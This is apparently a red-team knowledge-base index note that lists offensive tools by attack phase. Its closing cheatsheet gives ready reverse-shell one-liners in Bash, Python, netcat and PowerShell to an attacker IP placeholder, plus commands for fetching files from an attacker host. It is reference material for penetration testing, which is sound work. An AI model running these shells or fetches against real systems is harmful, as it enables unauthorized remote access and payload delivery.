---
type: section
room: red
tags: [red/tools]
---

# Red: Instruments

> [!quote]
> *"When you have a tool for every problem, it is only a matter of choosing the right one."*

The working kit for offensive operations. Each instrument note follows [[Templates/Red - Tool Note]] — purpose, key flags, common patterns, MITRE mapping, and OPSEC considerations.

---

## Inventory by Phase

### Reconnaissance
| Tool | Role | Note |
|------|------|------|
| `nmap` | Port & service scanning | [[nmap]] |
| `masscan` | High-speed port sweep | [[masscan]] |
| `amass` | Subdomain enumeration | [[amass]] |
| `subfinder` | Passive subdomain discovery | [[subfinder]] |
| `theHarvester` | Email & domain OSINT | [[theHarvester]] |
| `shodan` | Internet exposure lookup | [[shodan]] |
| `whatweb` | Web tech fingerprinting | [[whatweb]] |
| `dnsx` | DNS resolution & bruting | [[dnsx]] |
| `wafw00f` | WAF detection | [[wafw00f]] |
| `nuclei` | Template-based vuln scanner | [[nuclei]] |

### Web Exploitation
| Tool | Role | Note |
|------|------|------|
| `gobuster` | Directory & DNS bruting | [[gobuster]] |
| `ffuf` | Fast web fuzzer | [[ffuf]] |
| `burpsuite` | Web proxy & testing platform | [[burpsuite]] |
| `sqlmap` | SQL injection automation | [[sqlmap]] |
| `wfuzz` | Web fuzzer (advanced params) | [[wfuzz]] |
| `feroxbuster` | Recursive content discovery | [[feroxbuster]] |

### Exploitation
| Tool | Role | Note |
|------|------|------|
| `metasploit` | Exploit framework | [[metasploit]] |
| `searchsploit` | ExploitDB offline search | [[searchsploit]] |
| `pwntools` | CTF exploit scripting | [[pwntools]] |

### Credential Access
| Tool | Role | Note |
|------|------|------|
| `hydra` | Network brute-force | [[hydra]] |
| `hashcat` | Password cracking (GPU) | [[hashcat]] |
| `john` | Password cracking (CPU) | [[john]] |
| `crackmapexec` / `netexec` | SMB/AD credential testing | [[netexec]] |
| `mimikatz` | Windows credential extraction | [[mimikatz]] |
| `secretsdump` | Remote credential extraction | [[secretsdump]] |

### Privilege Escalation
| Tool | Role | Note |
|------|------|------|
| `linpeas` | Linux PrivEsc automation | [[linpeas]] |
| `winpeas` | Windows PrivEsc automation | [[winpeas]] |
| `pspy` | Linux process spy | [[pspy]] |
| `powerup` | Windows service misconfig | [[powerup]] |
| `linux-exploit-suggester` | Kernel CVE suggestions | [[les]] |
| `wesng` | Windows exploit suggester | [[wesng]] |

### Active Directory
| Tool | Role | Note |
|------|------|------|
| `bloodhound` | AD attack path mapping | [[bloodhound]] |
| `sharphound` | AD data collection | [[sharphound]] |
| `impacket` | AD protocol suite | [[impacket]] |
| `evil-winrm` | WinRM shell | [[evil-winrm]] |
| `kerbrute` | Kerberos user enumeration | [[kerbrute]] |

### Post-Exploitation / C2
| Tool | Role | Note |
|------|------|------|
| `netcat` | Reverse shell / listener | [[netcat]] |
| `socat` | Advanced relay & shell | [[socat]] |
| `chisel` | TCP tunnelling over HTTP | [[chisel]] |
| `ligolo-ng` | Transparent proxy pivoting | [[ligolo-ng]] |

---

## One-liner Cheatsheets

### Reverse Shell Quick-Ref
```bash
# Bash
bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (with -e)
nc <attacker_ip> <port> -e /bin/bash

# Netcat (without -e — FIFO trick)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> <port> > /tmp/f

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Shell Upgrade
```bash
# After catching a raw shell, upgrade to fully interactive
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press: Ctrl+Z
stty raw -echo; fg
# Press: Enter twice
export TERM=xterm
```

### File Transfer Quick-Ref
```bash
# Attacker → Target (HTTP)
python3 -m http.server 8080   # on attacker

# Target fetches:
wget http://<attacker_ip>:8080/<file>
curl -o <file> http://<attacker_ip>:8080/<file>
# Windows:
certutil -urlcache -f http://<attacker_ip>:8080/<file> <file>
powershell -c "Invoke-WebRequest -Uri 'http://<attacker_ip>:8080/<file>' -OutFile '<file>'"
```

---

## Conventions

- **One note per tool**, named after the tool exactly
- **Template:** [[Templates/Red - Tool Note]]
- **Tags:** `#red/tool` + `#red/<phase>` (e.g. `#red/recon`)

↩ [[Red]] · [[Mind Palace]]